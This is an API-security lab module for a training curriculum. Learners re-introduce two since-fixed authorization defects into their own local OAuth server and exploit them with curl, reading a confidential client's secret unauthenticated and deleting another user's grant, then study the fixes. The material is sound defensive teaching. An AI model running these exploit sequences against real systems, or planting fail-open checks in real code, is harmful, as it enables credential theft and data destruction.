# Module 11 — Lab

> **What you will do:** retrieve a confidential client's secret with no credentials at all; then run a
> cross-user **BOLA** in which one user reads and then **destroys** another user's grant, using a perfectly
> valid, correctly scoped token; then prove which layer owns each defect, read the fix that shipped, and
> argue with it.

**These were real vulnerabilities in the server you have been running for eleven modules.** They were found
during this module's build, and both are now **fixed** — in commit `0229daa`. That changes how you run the
lab but not what you take from it. Each of the first two exercises has you **re-introduce the original defect
in your own working tree**, exploit it for real, then restore the file and read the patch that closed it.

Two things make this worth more than the original exercise, not less. Putting a defect back by hand forces you
to say exactly which line caused it — a precision that "find the bug" does not require. And you end up with a
real fix to hold the lab's own model answer against. In Exercise 4 the two disagree, and you have to decide
who is right.

> **Scope discipline.** Everything here runs against *your own* local server, and there are exactly two source
> edits below — one line added in Exercise 1, two lines removed in Exercise 2 — each reverted with a single
> `git checkout`. Nothing in this lab is transferable to a system you do not operate, and the point is
> defensive: you are learning to find these in code review.
>
> **Check you are clean before you start, and again when you finish:**
> ```bash
> git status --short server/          # must print nothing
> ```

---

## Before you start

```bash
set -a; source docs/curriculum/scripts/curriculum.env; set +a
curl -s -o /dev/null -w "%{http_code}\n" "$API/health"     # expect 200
```

Before running anything, read **`server/src/routes/client.routes.ts`** — all 40 lines — and write down what
you expect `GET /api/client/get/<a client id>` to do without credentials. Note that nothing in that file
mentions authentication at all. Then read **`server/src/middleware/require-basic-auth.ts`**, lines 5–14, and
revise your prediction. That comment is worth reading twice: it exists *because* of the defect you are about
to re-create.

---

## Exercise 1 — BFLA: the management API that asked for nothing

**API5:2023 — Broken Function Level Authorization**, enabled by **API8 — Security Misconfiguration**.

Start with what the server does today. No token, no Basic auth, no header of any kind:

```bash
curl -s -w '\nstatus=%{http_code}\n' "$API/client/get/$CLIENT_ID"
```

```json
{"error":"invalid_client","error_description":"Client authentication required"}
status=401
```

That is the fix working. To understand what it is worth, put the bug back.

### 1a — Re-introduce the defect

The original guard returned `true` — *allow* — when its own configuration was missing. Re-create exactly that,
one added line:

```bash
perl -0pi -e 's/(if \(!mgmtClientId \|\| !mgmtClientSecret\) \{\n)/$1      return true;   \/\/ LAB: original fail-open behaviour\n/' \
  server/src/middleware/require-basic-auth.ts

git diff server/src/middleware/require-basic-auth.ts     # confirm: exactly one line added
```

Now run a second server with no management credentials. Setting them to the **empty string** is deliberate:
`dotenv` never overwrites a variable already present in the environment, so this defeats the real values in
`server/.env` without touching the file.

```bash
# separate terminal — nothing on :3000 is touched
MGMT_CLIENT_ID= MGMT_CLIENT_SECRET= PORT=3006 npm --prefix server run dev
```

```bash
export VULN=http://localhost:3006/api
curl -s -o /dev/null -w '%{http_code}\n' "$VULN/health"          # expect 200
```

### 1b — Exploit it

```bash
curl -s "$VULN/client/get/$CLIENT_ID" | python3 -c "
import sys,json; d=json.load(sys.stdin)
print('clientName  :', d.get('clientName'))
print('clientType  :', d.get('clientType'))
print('clientSecret:', (d.get('clientSecret') or '')[:8] + '…  <-- TRUNCATED HERE ONLY; the API returned it in full')
print('redirectUris:', d.get('redirectUris'))"
```

```
clientName  : test
clientType  : CONFIDENTIAL
clientSecret: EXAMPLE-…  <-- TRUNCATED HERE ONLY; the API returned it in full
redirectUris: ['https://<your-host>/']
```

**An unauthenticated caller just read a confidential client's secret in plaintext.** Stop and work out what
that is worth. With that secret and the client ID, an attacker authenticates *as that client* at the token
endpoint — the exact credential that eleven modules of PKCE, PAR and DPoP exist to protect. Every protocol
control in this curriculum is bypassed, not broken.

Keep going — same server, still no credentials:

```bash
# Enumerate any subject's authorized clients
curl -s "$VULN/client/auth/list/$LAB_USER" | python3 -c "
import sys,json; d=json.load(sys.stdin)
print('subject:', d.get('subject'), '| clients:', d.get('totalCount'))
for c in d.get('clients', []): print('   ', c.get('clientId'), '-', c.get('clientName'))"

# List every access token the service has issued
curl -s "$VULN/token/list" | python3 -c "
import sys,json; d=json.load(sys.stdin)
print('total access tokens on this service:', d.get('totalCount'))"
```

```
subject: admin | clients: 2
    <public-client-id>  - Testing App
    <confidential-client-id> - test
total access tokens on this service: 65
```

> Do not add `-w '%{http_code}'` to those two commands. `-w` writes to stdout, so the status code lands inside
> the JSON and `json.load` raises. Use a separate `curl` call when you want the status.

Now name the cause precisely. It is **not** a missing check:

```bash
grep -n "checkAuth" server/src/controllers/client.management.controller.ts | head -3
sed -n '57,59p' server/src/middleware/require-basic-auth.ts
```

```
7:const checkAuth = requireBasicAuth("client_management");
12:      if (!checkAuth(req, res)) return;
28:      if (!checkAuth(req, res)) return;
```
```js
    if (!mgmtClientId || !mgmtClientSecret) {
      return true;   // LAB: original fail-open behaviour
```

**The check exists, is correctly written, and is wired into every one of the sixteen controllers.** It returns
*allow* when its configuration is absent. One unset environment variable disables authentication across the
entire management surface — and note that `:3000`, with the same code, is unaffected, because its credentials
are set. The defect is invisible in any environment that happens to be configured.

Three things to take from this, and the third is the important one:

1. **This was a documented dev convenience, not a hidden zero-day.** `AGENTS.md` described the behaviour at
   the time. A report that opens with "undocumented critical vulnerability" is wrong on the facts and will be
   dismissed on those grounds — say what the docs claimed, then say why it was not enough.
2. **The documentation understated the blast radius.** "Management routes are unprotected" and "hands a
   confidential client's secret to anonymous callers" are the same sentence describing very different risks.
   When you write this up, describe the *consequence*, not the mechanism.
3. **Fail-open is the actual defect.** A missing security config should refuse to serve, not silently permit
   everything. And note the reason it survived: the failure has no symptom. Nothing logs, nothing 500s, the
   tests pass, and the endpoint looks like it is working — because it is.

### 1c — Restore, then read the fix

```bash
git checkout -- server/src/middleware/require-basic-auth.ts
git status --short server/           # must print nothing
```

`ts-node-dev --respawn` reloads the `:3006` server by itself. Re-run the exploit against it — the credentials
there are still unset:

```bash
curl -s -w '\nstatus=%{http_code}\n' "$VULN/client/get/$CLIENT_ID"
```

```json
{"error":"invalid_client","error_description":"Client authentication required"}
status=401
```

Now read the patch — `require-basic-auth.ts` lines 26–41 and 55–64 — and find the three things it does beyond
flipping that return value. Each one answers a specific weakness in the original:

| What the fix adds | Which problem it answers |
|---|---|
| `deny()` sends the identical message for "no credentials" and "misconfigured" | telling an anonymous caller that admin auth is broken is free reconnaissance |
| `log.error("Management credentials are not configured…")` on every rejection | the original had **no symptom**; now the operator has one |
| `warnIfManagementCredentialsMissing()`, called once from `server.ts` | the symptom arrives at startup, not after the first attack |

Check the second one for yourself — that line is in the `:3006` terminal, once per rejected request. **This is
the whole answer to point 3: failing closed is necessary but not sufficient.** A fail-closed check with no
diagnostics turns a silent breach into a silent outage, and you will be debugging it at 3am with no clue.

Stop the `:3006` server now (Ctrl-C in its terminal).

---

## Exercise 2 — BOLA: destroying another user's grant

**API1:2023 — Broken Object Level Authorization.** This is the module's headline, and unlike Exercise 1 there
is no missing credential anywhere: every request below carries a **valid, correctly scoped, unexpired** access
token.

Confirm the current behaviour first — read `server/src/routes/grant-management.routes.ts`, all 22 lines. The
fix is one middleware, named for exactly what it does, with a comment saying why the upstream API cannot do it.
Then take it off:

```bash
perl -0pi -e 's/^\s*requireGrantOwnership\("grant_management_(?:query|revoke)"\),\n//gm' \
  server/src/routes/grant-management.routes.ts

git diff server/src/routes/grant-management.routes.ts     # confirm: exactly two lines removed
```

The routes now go straight to their controllers, which is what the file looked like when the BOLA was found.
Nothing else breaks — `grant-management.service.ts` has its own `extractBearerToken`, so the middleware is the
only thing you removed. (The now-unused import is fine; `--transpile-only` does not care, and you are about to
revert it.)

You also need two users. Run a **second, isolated server instance** with its own demo users — `AUTH_USERS` is
the mechanism `AGENTS.md` documents for exactly this:

```bash
# separate terminal — nothing on :3000 is touched
PORT=3005 AUTH_USERS="alice:alice:alicepw:Alice;bob:bob:bobpw:Bob" npm --prefix server run dev
```

```bash
export API5=http://localhost:3005/api
RUE=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$REDIRECT_URI")

mkgrant() {   # $1=user $2=pass $3=url-encoded scope  → prints the token response
  local J; J=$(mktemp)
  curl -s -c $J -o /dev/null "$API5/authorization?response_type=code&client_id=$CLIENT_ID&redirect_uri=$RUE&scope=$3&state=x&grant_management_action=create"
  local C1; C1=$(curl -s -b $J -c $J "$API5/session/login" | grep -o 'name="_csrf" value="[^"]*"' | head -1 | cut -d'"' -f4)
  local L2; L2=$(curl -s -b $J -c $J -o /dev/null -w '%{redirect_url}' -d "username=$1&password=$2&_csrf=$C1" "$API5/session/login")
  local CB
  if echo "$L2" | grep -q consent; then
    local C2; C2=$(curl -s -b $J -c $J "$API5/session/consent" | grep -o 'name="_csrf" value="[^"]*"' | head -1 | cut -d'"' -f4)
    CB=$(curl -s -b $J -c $J -o /dev/null -w '%{redirect_url}' -d "decision=approve&_csrf=$C2" "$API5/session/consent")
  else CB="$L2"; fi
  curl -s -u "$CLIENT_ID:$CLIENT_SECRET" \
    -d "grant_type=authorization_code&code=$(node -e 'const u=new URL(process.argv[1]);process.stdout.write(u.searchParams.get("code")||"")' -- "$CB")&redirect_uri=$RUE" "$API5/token"
  rm -f $J
}

mkgrant alice alicepw "profile%20grant_management_query%20grant_management_revoke" > /tmp/alice.json
mkgrant bob   bobpw   "address%20grant_management_query%20grant_management_revoke" > /tmp/bob.json

GA=$(python3 -c "import json;print(json.load(open('/tmp/alice.json'))['grant_id'])")
TA=$(python3 -c "import json;print(json.load(open('/tmp/alice.json'))['access_token'])")
GB=$(python3 -c "import json;print(json.load(open('/tmp/bob.json'))['grant_id'])")
TB=$(python3 -c "import json;print(json.load(open('/tmp/bob.json'))['access_token'])")
echo "alice grant ${GA:0:10}…   bob grant ${GB:0:10}…"
```

Note the scopes deliberately differ — Alice's grant covers `profile`, Bob's covers `address`. That makes the
two objects distinguishable, which matters in a moment.

**Predict the next three results before running them.**

```bash
echo "-- CONTROL: alice reads her own grant --"
curl -s -H "Authorization: Bearer $TA" "$API5/gm/$GA" -w '  [%{http_code}]\n' | head -c 90; echo
echo "-- BOLA read: BOB's token, ALICE's grant --"
curl -s -H "Authorization: Bearer $TB" "$API5/gm/$GA" -w '  [%{http_code}]\n' | head -c 90; echo
echo "-- BOLA read: ALICE's token, BOB's grant --"
curl -s -H "Authorization: Bearer $TA" "$API5/gm/$GB" -w '  [%{http_code}]\n'
```

```
-- CONTROL: alice reads her own grant --
{"scopes":[{"scope":"grant_management_query grant_management_revoke profile"}]  [200]
-- BOLA read: BOB's token, ALICE's grant --
{"scopes":[{"scope":"grant_management_query grant_management_revoke profile"}]  [200]
-- BOLA read: ALICE's token, BOB's grant --
{"scopes":[{"scope":"address grant_management_query grant_management_revoke"}],"claims":["address"]}   [200]
```

Look carefully at the third line. Alice asked for Bob's grant and got **Bob's** contents — `address`, not her
own `profile`. So the endpoint **is** resolving the object correctly; it looks up exactly the grant you name.
It simply never asks whether the grant belongs to the caller.

That distinction is the diagnostic. A vaguer test — two grants with identical scopes — would have produced
identical output and left you unable to tell "correctly resolved, not authorized" from "ignoring the ID
entirely". **Design your BOLA tests so the two objects are distinguishable.**

Now the write primitive:

```bash
echo "-- BOLA write: BOB's token DELETEs ALICE's grant --"
curl -s -X DELETE -H "Authorization: Bearer $TB" "$API5/gm/$GA" -w '  [%{http_code}]\n'
echo "-- did alice's grant survive? --"
curl -s -H "Authorization: Bearer $TA" "$API5/gm/$GA" -w '  [%{http_code}]\n'
```

```
-- BOLA write: BOB's token DELETEs ALICE's grant --
  [204]
-- did alice's grant survive? --
{"error":"not_found","error_description":"Grant not found"}   [404]
```

**Bob destroyed Alice's grant.** Not read it — destroyed it. Any user holding a `grant_management_revoke`
token can enumerate grant IDs and revoke every consent on the service. That is a denial-of-service primitive
against every user of every client, delivered through an endpoint where **every OAuth control worked
perfectly.**

Count what did work: the token was signed, unexpired, audience-correct, and carried exactly the scope the
endpoint requires. Scope enforcement is real here — try Bob's `grant_management_query`-only token on a
`DELETE` and you get 401. **The protocol layer is flawless and the outcome is catastrophic.** That sentence
is the entire module.

### Restore, then verify the fix

Alice's grant is gone, but Bob's (`$GB`) survives and Alice's token (`$TA`) is still valid — which is all you
need, and costs no new Authlete calls:

```bash
git checkout -- server/src/routes/grant-management.routes.ts
git status --short server/           # must print nothing
```

Wait for the `:3005` terminal to finish respawning, then run the same cross-user read that returned 200 a
moment ago, plus a control:

```bash
echo "-- BOLA read, post-fix: ALICE's token, BOB's grant --"
curl -s -H "Authorization: Bearer $TA" "$API5/gm/$GB" -w '  [%{http_code}]\n'
echo "-- CONTROL: bob reads his own grant --"
curl -s -H "Authorization: Bearer $TB" "$API5/gm/$GB" -w '  [%{http_code}]\n' | head -c 90; echo
```

```
-- BOLA read, post-fix: ALICE's token, BOB's grant --
{"error":"access_denied","error_description":"The access token is not associated with the requested grant"}   [403]
-- CONTROL: bob reads his own grant --
{"scopes":[{"scope":"address grant_management_query grant_management_revoke"}]  [403 → 200]
```

The control matters as much as the denial: a "fix" that returns 403 to everyone passes the first assertion and
has broken the feature. You will see this exact pair again in Exercise 4, where it is the deliverable.

Now read `server/src/middleware/require-grant-ownership.ts` and find how it decides. It introspects the bearer
token **before** the grant-management call and requires the grant the token was itself issued under to equal
the grant in the URL. Two consequences worth noticing before Exercise 3:

- It has to introspect on every request, because Authlete's `/gm` response carries no owner field — the
  decision is impossible to make afterwards. That is a real cost the fix pays, and Exercise 3 explains why it
  had no choice.
- A **client-credentials token has no grant at all**, so it is denied too. That makes this deliberately
  stricter than the spec, which entitles a client to manage grants it owns. Decide whether you would have
  shipped that trade-off.

---

## Exercise 3 — Whose bug is it?

Before writing a finding, establish which layer owns it. Module 06 set this discipline; apply it.

Read what the server sends upstream:

```bash
sed -n '10,26p' server/src/services/grant-management.service.ts
```

```js
  async query(req: Request, grantId: string): Promise<GMResponse> {
    const log = req.logger || logger;
    const accessToken = extractBearerToken(req);

    log("GrantManagement: query grant", { grantId });

    const response = await this.authleteApi.grantManagement.processRequest({
      serviceId,
      gMRequest: {
        accessToken,
        gmAction: "QUERY",
        grantId,
      },
    });

    return response;
  }
```

The service forwards the access token and the grant ID and relays the answer. It performs no ownership check —
and note it has no *cheap* way to: it would have to introspect the token for a subject and ask Authlete who
owns the grant. Keep that cost in mind; it is why the fix you read in Exercise 2 sits in middleware and spends
an extra round trip per request. So ask the upstream directly:

```bash
set -a; . ./server/.env; set +a          # AUTHLETE_BEARER_TOKEN — never paste it anywhere
curl -s -X POST -H "Authorization: Bearer $AUTHLETE_BEARER_TOKEN" -H 'Content-Type: application/json' \
  -d "{\"accessToken\":\"$TB\",\"gmAction\":\"QUERY\",\"grantId\":\"$GA\"}" \
  "$AUTHLETE_BASE_URL/api/$AUTHLETE_SERVICE_ID/gm" | python3 -c "
import sys,json; d=json.load(sys.stdin)
print('action    :', d.get('action'))
print('resultCode:', d.get('resultCode'))"
```

```
action    : OK
resultCode: A277001
```

**The upstream API itself returns `OK`** for Bob's token against Alice's grant. Note that this call bypasses
your server entirely, so the result is the same whether or not `requireGrantOwnership` is in place — the repo
was relaying a decision faithfully, and the ownership check was not being made anywhere in the chain. This is
also the evidence that the fix had to go where it went: no amount of care in the service layer can recover an
ownership decision from a response that does not contain one.

Now be careful about what you conclude, because this is where reports overreach. Search for a setting that
would enable it:

```bash
python3 - <<'PY'
import json,subprocess,os
# service and client config, filtered for anything grant-related
PY
# (or simply: read /service/get and /client/get output and grep for "grant")
```

On this deployment the only grant-related switches are `grantManagementActionRequired`,
`grantManagementEndpoint` and `supportedGrantManagementActions`. **None of them concerns ownership.**

So the honest finding is:

> Cross-subject access to grant objects is possible. The repo's service layer performs no ownership check and
> relays the upstream decision faithfully; a direct call to the upstream `/gm` API reproduces `action: OK` for
> a token belonging to a different subject. No service- or client-level setting governing grant ownership was
> found. **Whether this is an upstream defect or a missing configuration is `UNVERIFIED`** and should be
> raised with the vendor rather than asserted.

> ### ✅ **captured 2026-08-17** — reproduced, and it is worse than the paragraph above says
>
> **The claim above had no transcript anywhere in this repo** until it was run. That is worth noticing before
> the result: an assertion about a *security boundary*, published in a lab, carried for weeks on prose alone.
> Full record in [`SERVICE-CONFIG-PROBE.md` §27](../../../../audit/02-findings/SERVICE-CONFIG-PROBE.md).
>
> Two grants created under **different subjects** on the same client, each given a distinguishing scope so the
> two are told apart in the response — `profile` for A, `email` for B:
>
> | Case | `action` | What came back |
> |---|---|---|
> | control: A's token → A's grant | `OK` | A's grant (`profile`) |
> | **A's token → B's grant** | **`OK`** | **B's grant — including `email`** |
> | **B's token → A's grant** | **`OK`** | **A's grant — including `profile`** |
> | sanity: A's token → nonexistent grant | `NOT_FOUND` `[A283301]` | — |
> | sanity: bogus token → A's grant | `UNAUTHORIZED` `[A279306]` | — |
>
> **It is not an empty acknowledgement — the other subject's grant comes back.** The distinguishing scopes are
> what prove it; with identical scopes, `OK` would have been consistent with an empty ack. And **`REVOKE`
> crosses the boundary too**: A's token revoked B's grant (`NO_CONTENT`), after which B querying **its own**
> grant got `NOT_FOUND`. **A destroyed B's grant.**
>
> The two sanity rows are why the middle rows count as a measurement: Authlete **does** validate the token and
> **does** validate that the grant id exists. It never asks whether the one is entitled to the other.
>
> **So `requireGrantOwnership` is not "deliberate extra strictness" — it is a compensating control for
> cross-subject read *and delete* at the vendor API**, and it is the only thing between that and the public
> internet. The exercise's conclusion below stands; this strengthens it.
>
> **Still open, deliberately:** whether this is an upstream *defect* or a deliberate design that delegates
> ownership to the AS. This repo cannot answer that, and **asking the vendor is not a repo work item** — the
> same ruling that retired JARM-W6 on 2026-08-17. The behaviour is recorded; the attribution is labelled
> open rather than guessed.

That is the finding as filed, and every clause of it is still true. The repo's `requireGrantOwnership` is a
**compensating control**, not a resolution: it stops the attack at this deployment's edge and leaves the
upstream question exactly where it was. Say so when you write up a fix like this — a reader who thinks the
root cause is closed will not ask the vendor, and the next service built on the same API inherits the bug.

Compare that with what you could have written — *"critical vulnerability in Authlete"* — and note the
difference. You verified the behaviour exhaustively and stated the attribution to exactly the confidence your
evidence supports. That is the difference between a report that gets acted on and one that gets argued with.

**What the specification expects is not ambiguous**, and it belongs in the report: Grant Management §5.2 says
*"the respective client must be authorized to use the particular grant id"*, and a grant is defined
throughout as belonging to a client **and a resource owner**.

---

## Exercise 4 — Where does the fix go?

Write the fix for the BOLA **before** opening either answer below. You have already read the one that shipped,
so this is not a blank page — the exercise is to work out where you agree with it. Think about it as the
lesson's four-step argument, not as a patch.

<details>
<summary>My answer</summary>

**Not at the gateway.** A gateway can confirm the token is valid and carries `grant_management_query`. It
cannot know who owns grant `R9ksNHnx…` — that is upstream data.

**At the resource server, as a query constraint, not a check.** In this architecture the server must:

1. Introspect the presented access token to obtain its `sub` (and `client_id`).
2. Resolve the owner of `grantId`.
3. Compare, and return **404** — not 403 — on mismatch.

Step 3's status code matters: with 403 the endpoint becomes an oracle telling an attacker which grant IDs
exist, and grant IDs are the only thing standing between them and the attack.

**Better still, remove the choice.** If the upstream API accepted a *subject* alongside the grant ID and
resolved `(subject, grantId)` as a pair, no caller could construct the unsafe request at all. That is the
"make the insecure version unrepresentable" principle from the lesson, and it is the change I would ask the
vendor for.

**The test I would add**, which is the actual deliverable — a defect without a regression test comes back:

```
create grant as alice → create grant as bob
assert  bob's token GET  alice's grant  → 404
assert  bob's token DEL  alice's grant  → 404
assert  alice's token GET alice's grant → 200        # control: the fix didn't break the feature
```

Note the control assertion. A BOLA "fix" that denies everything passes the first two and is useless.
</details>

<details>
<summary>Where the shipped fix disagrees with that answer — and who is right</summary>

Read the two side by side. `requireGrantOwnership` matches steps 1 and 2 and then **returns 403, not the 404
argued for above.** One of them is wrong. Work out which before reading on.

The case for 404 is the one made above: 403 confirms the grant exists, so the endpoint becomes an existence
oracle, and grant IDs are the only secret standing between an attacker and the attack.

The case for 403 is what the code actually banks on:

- **The oracle is weaker than it looks.** The middleware returns the *same* 403 for "grant exists but is not
  yours" and "your token has no grant at all" (the client-credentials case). It never distinguishes a
  non-existent grant ID from a live one you do not own, so the reply leaks less than a bare 403 usually does.
- **404 lies to the legitimate caller too.** A client that has genuinely lost its own grant and one that
  fumbled an ID get identical answers, and the operator loses the ability to tell a bug from an attack.
- **The log carries what 404 would have hidden.** `log.error("Grant ownership denied", …)` records
  `requestedGrantId`, `subject`, `clientId` and whether the token was grant-bound. The information is kept
  where a defender can use it instead of being destroyed for everyone.

**Neither is unconditionally right, and that is the point.** 404 buys secrecy of identifiers; 403 buys
diagnosability. Which you want depends on whether the identifier is guessable — and grant IDs on this service
are high-entropy, which is the argument the shipped code is implicitly making. What is *not* defensible is
choosing either one without noticing there was a choice.

Now go back to your own answer and check something harder: did you specify what happens to a token with **no**
grant? If you did not, your fix has an unhandled case, and it is the one that a machine-to-machine client hits
on its first request.
</details>

---

## Exercise 5 — Would you have noticed?

Authorization defects are silent by design: every request is a 200. Read
[`docs/MONITORING.md`](../../../MONITORING.md) and `server/src/middleware/audit-log.ts`, then answer for
**each** of the following: would this deployment's telemetry reveal it, and what would you add?

1. Bob reads Alice's grant once.
2. An attacker enumerates 10,000 grant IDs in five minutes.
3. An unauthenticated caller reads one client secret.
4. An attacker slowly reads 200 client records over a week.

<details>
<summary>Discussion</summary>

**(1) No, and nothing reasonable would.** One authorized-looking 200 among thousands. Only a rule expressing
"the subject in the token differs from the owner of the object" could see it — and if you could write that
rule, you would enforce it instead of alerting on it. **This is why BOLA must be prevented, not detected.**

**(2) Yes, if you are looking.** `generalLimiter` (60/min) throttles it, and the Prometheus counter
`http_requests_total{route="/api/gm/:grantId", status="404"}` would spike. Note the label is the **route
template**, not the URL — good for cardinality, and it means the metric shows the enumeration even though
every ID is distinct. Alert on 404-rate-per-route, not on absolute counts.

**(3) Barely — and answer this for the *vulnerable* build, which is the version the question is about.** The
audit log records path, IP, user-agent, and `clientId` from Basic auth — absent here, so the entry looks like
ordinary traffic. A 200 on `/api/client/get/:clientId` is indistinguishable from a legitimate admin action.
**The absence of an authenticated principal in a log entry for an admin route is itself the signal**, and
nothing alerted on it.

Post-fix the request cannot succeed, and `log.error("Management credentials are not configured…")` fires on
every rejection — so the signal now exists. Ask the follow-up anyway: **who is alerted?** It is a `log.error`
in a rotating file with no Prometheus counter and no route to a pager. A signal nobody is paged on is
documentation, not detection.

**(4) No.** Under every rate limit, spread across a week, all 200s. This is API6 in miniature: each request
is individually legitimate and the aggregate is the breach. Catching it needs per-principal baselining, which
this deployment has no notion of — because it has no notion of a principal on those routes at all.

**The pattern:** telemetry catches *volume*, not *authorization*. Anything patient and low-rate is invisible.
Prevention is the control; monitoring is the backstop, and a weak one for exactly this class.
</details>

---

## Exercise 6 — Find the BOLA in code review

Real code-review practice. Each snippet has at least one defect from this module. Name it, classify it
(API1/API3/API5), and fix it.

```js
// A
router.get('/api/invoices/:id', requireScope('invoices:read'), async (req, res) => {
  const invoice = await db.invoices.findById(req.params.id);
  res.json(invoice);
});
```

```js
// B
router.patch('/api/users/:id', requireAuth, async (req, res) => {
  if (req.params.id !== req.user.sub) return res.sendStatus(403);
  const user = await db.users.update(req.params.id, req.body);
  res.json(user);
});
```

```js
// C
router.get('/api/reports/:id', requireAuth, async (req, res) => {
  const report = await db.reports.findOne({
    id: req.params.id,
    tenantId: req.headers['x-tenant-id'],
  });
  if (!report) return res.sendStatus(404);
  res.json(report);
});
```

<details>
<summary>Answers</summary>

**A — BOLA (API1).** The scope check gates the endpoint and nothing gates the row: any authenticated caller
with `invoices:read` reads any invoice. Fix:
`db.invoices.findOne({ id: req.params.id, ownerId: req.user.sub })` → 404 if absent. Also note it returns the
whole record, so it is a latent **BOPLA** too — send an explicit projection.

**B — BOPLA (API3), via mass assignment.** The BOLA is correctly handled (the `sub` comparison is right, if
403 rather than 404). But `req.body` goes straight into the update, so the user sets `role`, `is_admin`, or
`emailVerified` on **their own** record — self-privilege-escalation needs no BOLA. Fix: an explicit allow-list
of updatable fields.

**C — BOLA (API1) via a caller-controlled tenant.** The query *looks* right — it is scoped — but `tenantId`
comes from a **request header the caller sets**. Change `X-Tenant-Id` and read any tenant's reports. This is
the most dangerous snippet of the three, because it pattern-matches as the secure version and would pass most
reviews. Fix: take the tenant from the validated token's claims, never from the request. Worth noting the
gateway cannot save you here either — if the gateway sets the header, it must also *strip* any inbound copy,
and header-stripping bugs are common.
</details>

---

## Break it — two to reason about

1. **Your company adds an API gateway that validates tokens and enforces scope per route, and announces that
   "authorization is now centralised."** Write the two-paragraph reply you would send. Say what the gateway
   genuinely fixed, what it cannot fix, and what new risk the *announcement itself* creates.

2. **A team proposes fixing BOLA by encoding every object the user may access into the access token at
   issuance.** Give three reasons this fails, and name the one situation where a bounded version of it is
   actually the right answer.

---

## Verification block

- [ ] Read a **confidential client's secret** with no credentials, and can state what it is worth
- [ ] Enumerated a subject's authorized clients and counted the service's access tokens unauthenticated
- [ ] Can point at the one line that caused it and explain why **fail-open** is the defect
- [ ] Confirmed fail-*closed*: with `MGMT_*` still unset, the restored code returns **401** — and found the
      `log.error` that gives the operator a symptom the original had none of
- [ ] Ran a cross-user BOLA **read** — and used *differently scoped* grants to prove the object resolves
- [ ] Ran a cross-user BOLA **write** — one user destroyed another's grant (204, then 404)
- [ ] Confirmed the restored middleware returns **403** cross-user **and 200 on the control**
- [ ] Established the upstream returns `action: OK`, and wrote the attribution as **UNVERIFIED** — and can say
      why the repo's fix is a *compensating control* rather than a resolution
- [ ] Wrote the fix *and* its regression test, including the control assertion
- [ ] Took a position on **403 vs 404** for the denial, and named what each one costs
- [ ] Answered which of the four attacks the telemetry would catch (and why two of them cannot be)
- [ ] Classified all three review snippets, including why **C** is the dangerous one
- [ ] **`git status --short server/` prints nothing** — both temporary edits reverted

---

## Clean up

```bash
# stop the :3005 and :3006 instances (Ctrl-C in their terminals), then:
rm -f /tmp/alice.json /tmp/bob.json

# the important one — both temporary edits must be gone
git status --short server/           # must print nothing
git diff --stat server/              # must print nothing
```

If either prints anything, revert it now:

```bash
git checkout -- server/src/middleware/require-basic-auth.ts \
                server/src/routes/grant-management.routes.ts
```

The grants live on your Authlete service; revoke any that survive with `DELETE $API/gm/<grant_id>` using that
grant's own `grant_management_revoke` token. Note that this is now the *only* way to do it — with
`requireGrantOwnership` restored, Bob's token can no longer revoke anyone else's, which was the entire point.

---

## What to carry into the capstone

1. **The protocol layer can be flawless and the outcome catastrophic.** Exercise 2's every request was
   perfectly authenticated. Design reviews that stop at the token stop before the vulnerability.
2. **Fail-open is a design decision, and almost always the wrong one.** Exercise 1 was one `return true`.
   Failing closed is half the fix; the other half is emitting a symptom, or you have traded a silent breach
   for a silent outage.
3. **State attributions to the confidence your evidence supports.** "The upstream returns OK; whether that is
   a defect or a missing setting is unverified" is a stronger sentence than a confident accusation. And label
   a compensating control as one — otherwise nobody chases the root cause.
4. **Make the insecure version unrepresentable.** Owner-scoped queries beat ownership checks, for the same
   reason FAPI 2.0 chose PKCE over `c_hash`.
5. **A shipped fix is an argument, not an answer.** The 403-vs-404 disagreement in Exercise 4 has no universal
   winner, and the failure mode is not picking wrong — it is not noticing that a decision was being made.

**[→ Module 12 — Capstone](../12-capstone/README.md)** is next: design a high-assurance multi-tenant
authorization architecture and defend it, then find the flaws in a deliberately vulnerable variant. You now
have every tool the curriculum offers — and, more usefully, the habit of asking what each one does *not* do.
